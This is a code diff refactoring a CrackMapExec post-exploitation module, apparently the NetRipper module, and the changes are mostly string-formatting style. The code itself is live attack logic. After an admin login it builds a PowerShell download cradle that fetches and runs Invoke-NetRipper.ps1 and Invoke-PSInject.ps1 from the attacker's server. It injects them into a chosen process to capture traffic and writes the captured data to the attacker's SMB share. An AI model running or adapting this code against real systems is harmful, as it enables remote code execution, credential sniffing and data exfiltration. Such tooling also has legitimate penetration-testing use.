@@ -42,8 +42,9 @@ class CMEModule:
         self.smb_server.start()
 
     def on_admin_login(self, context, connection):
-        log_folder = 'netripper_{}'.format(connection.host)
-        command = 'Invoke-NetRipper -LogLocation \\\\{}\\{}\\{}\\ -ProcessName {}'.format(context.localip, self.share_name, log_folder, self.process)
+        log_folder = f'netripper_{connection.host}'
+        command = f'Invoke-NetRipper -LogLocation \\\\{context.localip}\\{self.share_name}\\{log_folder}\\ -ProcessName {self.process}'
+
 
         netripper_cmd = gen_ps_iex_cradle(context, 'Invoke-NetRipper.ps1', command, post_back=False)
         launcher = gen_ps_inject(netripper_cmd, context)
@@ -52,18 +53,21 @@ class CMEModule:
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-PSInject.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-PSInject.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(self.ps_script1)
 
-        elif 'Invoke-NetRipper.ps1' == request.path[1:]:
+        elif request.path[1:] == 'Invoke-NetRipper.ps1':
             request.send_response(200)
             request.end_headers()
 
             #We received the callback, so lets setup the folder to store the screenshots
-            log_folder_path = os.path.join(context.log_folder_path, 'netripper_{}'.format(request.client_address[0]))
+            log_folder_path = os.path.join(
+                context.log_folder_path, f'netripper_{request.client_address[0]}'
+            )
+
             if not os.path.exists(log_folder_path): os.mkdir(log_folder_path)
 
             request.wfile.write(self.ps_script2)
